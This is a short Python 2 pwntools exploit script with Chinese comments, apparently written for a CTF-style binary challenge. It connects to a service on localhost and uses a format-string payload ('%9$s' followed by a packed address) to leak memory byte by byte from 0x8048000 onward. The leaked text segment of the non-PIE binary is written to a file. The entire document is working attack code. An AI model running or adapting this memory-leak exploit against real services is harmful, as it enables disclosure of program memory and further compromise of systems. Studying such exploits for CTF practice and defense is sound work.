#! /usr/bin/env python 
# -*- coding: utf-8 -*- 
from pwn import *
import binascii
context.log_level = 'info' 
r = remote('127.0.0.1',10001)

def leak(addr):
	# addr偏移是9，.TMP用于隔断每次输入
    payload = "%9$s.TMP" + p32(addr)
    r.sendline(payload)
    print "leaking:", hex(addr)
    # 接受垃圾数据
    r.recvuntil('right:')
    # 接受泄露内容（bytes字节型）
    ret = r.recvuntil(".TMP",drop=True)
    # 将bytes型的ascii转bytes型十六进制
    print "ret:", binascii.hexlify(ret), len(ret)
    # 持续接受直到EOF或timeout
    # 用来接受垃圾数据，下个循环直接输入数据
    remain = r.recvrepeat(0.2)
    return ret

# name
r.recv()
r.sendline('moxiaoxi')
r.recv()

# leak
# 从哪个地址开始泄露，0x8048000这个是没有开PIE的程序加载初地址
begin = 0x8048000
# 存储数据的中间变量
text_seg =''
try:
    while True:
        ret = leak(begin)
        text_seg += ret
        # 下一轮泄露地址=现在地址+本轮泄露长度
        begin += len(ret)
        # 处理泄露数据是\x00
        if len(ret) == 0:   
            begin +=1
            text_seg += '\x00'
# 异常处理
except Exception as e:
    print e
finally:
	# 泄露数据总长度
    print '[+]',len(text_seg)
    # 最后写入数据
    with open('dump_bin','wb') as f:
        f.write(text_seg)